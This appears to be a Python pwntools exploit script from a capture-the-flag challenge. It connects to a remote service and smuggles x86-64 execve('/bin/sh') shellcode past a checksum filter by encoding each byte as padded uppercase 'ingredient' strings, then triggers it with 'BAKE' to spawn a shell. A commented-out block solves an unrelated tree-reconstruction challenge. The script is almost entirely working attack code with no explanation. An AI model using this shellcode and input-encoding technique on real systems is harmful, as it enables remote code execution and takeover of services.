from pwn import *
import ast

base_string = "SUGAR"

#shellcode = "\x48\xb9\xff\xff\xff\xff\xff\xff\xff\xff\x49\xb8\xae\xb7\x72\xc3\xdb\xf0\xfa\xff\x49\x31\xc8\x41\x50\x49\xb8\xd0\x9d\x96\x91\xd0\xd0\x8c\x97\x49\x31\xc8\x41\x50\x49\xb8\xb7\xce\x2d\xad\x4f\xc4\xb7\x46\x49\x31\xc8\x41\x50\xff\xe4"
#shellcode = "\x90\x90\x90\xc3"


shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xC0\xb0\x3b\x0f\x05"

base_val = 0
min_val = 65
max_val = 90

def add_bytes(string):
    cpt = 0
    for c in string:
        cpt += ord(c)
    return cpt + base_val

def pad_string(string, sh):
    while (ord(sh) - add_bytes(string)) % 256 < min_val or (ord(sh) - add_bytes(string)) % 256 > max_val :
        #print "string is " + string + " addbytes val is " + str(add_bytes(string)) + " mod256 " + str(add_bytes(string) % 256)
        string += "Z"
    #print "string is " + string + " addbytes val is " + str(add_bytes(string)) + " mod256 " + str(add_bytes(string) % 256)
    string += chr((ord(sh) - add_bytes(string)) % 256)
    return string


HOST='52.17.31.229'
PORT=31337
s = remote(HOST,PORT)

intro = s.recvuntil('up to ')
print intro

rand = s.recvuntil(' ')
print "got value " + rand

base_val = int(rand) / 4919
print "base val is " + str(base_val)
bytes_sum = add_bytes(base_string) + base_val
#base_string += chr((2**8) - (bytes_sum % (2**8)))

print "base string is " + base_string

print s.recvuntil("ingredient> ")

#upload shellcode
for sh in shellcode:
    #print sh
    print "sending " + pad_string(base_string, sh)
    s.send(pad_string(base_string, sh) + "\n")
    print s.recvuntil("ingredient> ")

print "sending BAKE"

s.send("BAKE" + "\n")
print s.recv(1024)


"""
HOST='188.166.133.53'
PORT=11491
s = remote(HOST,PORT)

intro = s.recvuntil('path?\n')
print intro

print "time to finish"
i = 0
iteration = 0
while True:
    if i == 1: 
        response = s.recvuntil('!\n')
        print "reponse: " + response
    if iteration == 50:
        print s.recv(1024)
    level = s.recvuntil(']')
    print "level: " + level
    values = []
    try:
        values = ast.literal_eval(level[10:])
    except:
       values = ast.literal_eval(level[11:])
    print values
    n = Node()
    n.build_from_preorder(values)
    var = n.print_tree()
    var = "[" + var + "]"
    print "[*] sending " + var
    s.send(var + "\n")
    i = 1
    iteration += 1"""